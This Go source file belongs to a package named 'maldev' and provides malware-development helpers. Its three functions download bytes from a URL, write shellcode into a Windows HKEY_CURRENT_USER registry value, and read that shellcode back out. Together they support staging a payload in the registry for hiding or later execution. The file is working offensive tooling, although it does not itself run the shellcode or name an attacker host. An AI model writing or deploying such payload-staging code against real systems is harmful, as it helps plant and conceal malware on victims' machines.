package maldev

import (
	"errors"
	"io"
	"net/http"

	"golang.org/x/sys/windows/registry"
)

func DownloadFromURL(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return data, nil
}
func StoreShellcodeInRegistry(sc []byte, key, name string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, key, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return errors.New("[!] Failed to open registry key " + err.Error())
	}
	if err := k.SetBinaryValue(name, sc); err != nil {
		return errors.New("[!] Failed to write to registry " + err.Error())
	}
	if err := k.Close(); err != nil {
		return errors.New("[!] Failed to close registry key " + err.Error())
	}
	return nil
}

func GetShellcodeFromRegistry(key, name string) ([]byte, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, key, registry.QUERY_VALUE)
	if err != nil {
		return nil, errors.New("[!] Failed to open registry key " + err.Error())
	}
	sc, _, err := k.GetBinaryValue(name)
	if err != nil {
		return nil, errors.New("[!] Failed to read from registry " + err.Error())
	}
	return []byte(sc), nil
}
